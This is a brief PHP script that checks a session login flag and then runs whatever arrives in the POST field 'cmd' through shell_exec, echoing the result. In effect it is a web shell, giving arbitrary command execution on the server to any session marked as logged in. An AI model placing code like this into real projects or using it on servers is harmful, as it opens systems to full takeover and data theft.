<?php

	session_start();
	if ($_SESSION['logged'] !== TRUE){
		header("Location: /login");
		die();
	}

    $userCMD = $_POST['cmd'];

    echo shell_exec($userCMD);;
?>